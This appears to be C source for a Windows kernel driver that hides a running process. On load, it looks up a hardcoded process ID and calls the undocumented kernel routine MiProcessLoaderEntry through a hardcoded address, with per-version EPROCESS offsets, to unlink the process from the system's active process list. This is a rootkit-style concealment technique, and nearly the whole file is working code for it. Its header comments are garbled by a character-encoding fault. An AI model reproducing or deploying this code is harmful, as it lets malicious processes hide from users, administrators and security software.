/*************************************************
Copyright (C), 2009-2012    , Level Chip Co., Ltd.
�ļ���:	main.c
��  ��:	Ǯ��      �汾: V0.0.1     �½�����: 2025.01.26
��  ��: win7 32λ����ϵͳ�Ľ�������
��  ע: ��Ҫʹ��windbg x nt!MiProcessLoaderEntry ��ȡMiProcessLoaderEntry�������ַ
�޸ļ�¼:

  1.  ����: 2025.01.26
	  ����: Ǯ��
	  ����:
		  1) ��Ϊģ���һ���汾��
	  �汾:V0.0.1

*************************************************/

#include <ntifs.h>
#include <ntddk.h>

#include "ExportAPI.h"

UINT32 GetProcessOffset(VOID)
{
	if (SharedUserData->NtMajorVersion == 5) //win xp����ϵͳ
	{
		return 0x88;
	}
	else if (SharedUserData->NtMajorVersion == 6 && SharedUserData->NtMinorVersion == 1)
	{
		if (sizeof(PVOID) == 4)			//win7 32λ����ϵͳ
		{
			return 0xB8;
		}
		else							//win7 64λ����ϵͳ
		{
			return 0x188;
		}
	}
	
	return 0;
}

//��������
VOID ProcessHide(HANDLE ProcessId)
{
	PEPROCESS ptPeProcess = NULL;
	PFNMIPROCESSLOADERENTRY MinProcessLoaderEntry = NULL;
	NTSTATUS lNTStatus = STATUS_SUCCESS;

	lNTStatus = PsLookupProcessByProcessId(ProcessId, &ptPeProcess);
	if (!NT_SUCCESS(lNTStatus))
	{
		KdPrint(("PsLookupProcessByProcessId is err\n"));
		return;
	}

#ifdef _X86_
	MinProcessLoaderEntry = (PFNMIPROCESSLOADERENTRY)0x83eb8b37;
#endif // _x86

	if (!MinProcessLoaderEntry)
	{
		KdPrint(("MinProcessLoaderEntry is empty\n"));
		return;
	}

	MinProcessLoaderEntry((PCHAR)ptPeProcess + GetProcessOffset(), FALSE);
}

VOID DriverUnload(IN PDRIVER_OBJECT DriverObject)
{
	KdPrint(("����ж�سɹ�\n"));
}

NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath)
{
	NTSTATUS lNTStatus = STATUS_SUCCESS;
	HANDLE hThread = NULL;

	DriverObject->DriverUnload = DriverUnload;

	ProcessHide((HANDLE)2164);

	KdPrint(("�������سɹ�\n"));

	return lNTStatus;
}



